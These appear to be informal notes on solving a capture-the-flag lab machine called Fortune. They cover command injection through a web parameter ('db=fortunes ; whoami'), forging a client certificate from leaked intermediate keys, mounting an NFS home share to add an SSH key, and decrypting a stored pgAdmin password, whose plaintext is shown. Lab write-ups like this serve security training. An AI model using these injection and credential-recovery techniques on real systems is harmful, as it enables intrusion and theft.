10.10.10.127

# Website sends parameter to db and allows appending of commands
>>> db=fortunes ; whoami

# The binary seems to be run from the webpage
>>> /usr/games/fortune

# We find a directory of certificates using the intermediate certificates we can make a pk12 cert that
# user authenticates us
>>> openssl pkcs12 -export -inkey intermediate.key.pem -in intermediate.cert.pem -out intermediate.p12

# This provides us with a page to create ssh certs

# Page greets us with:

    You will need to use the local authpf service to obtain elevated network access. 
    If you do not already have the appropriate SSH key pair, then you will need to 
    generate one and configure your local system appropriately to proceed.

# This is a service that seems to allow traffic out a new nmap scan gives us:

>>> ssh nfsuser@10.10.10.127

Nmap scan report for 10.10.10.127
Host is up (0.094s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp   open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3         2049/tcp  nfs
|   100003  2,3         2049/udp  nfs
|   100005  1,3          662/udp  mountd
|_  100005  1,3          939/tcp  mountd
443/tcp  open  ssl/https?
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs        2-3 (RPC #100003)
8081/tcp open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: pgadmin4

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.86 seconds

# /etc/exports just has "home" in it?
# it allows us to mount the home directory, this gives us write access in the
# nfsuser directory?

# Can get the flag from Charlie's directory. 
# By adding the key we received earlier we can get onto ssh with Charlie

>>> sudo mount -t nfs 10.10.10.127:home /mnt

# ROOT

/usr/local/pgadmin4
/usr/local/pgadmin4/.virtualenvs/pgadmin4

/var/appsrv/pgadmin4

# Need to look at how the passwords are encrypted

>>> from pgadmin.utils.crypto import encrypt, decrypt, pqencryptpassword

# The password we need to decrypt:

>>> utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz

# Using the python decrypt file we get:

>>> R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!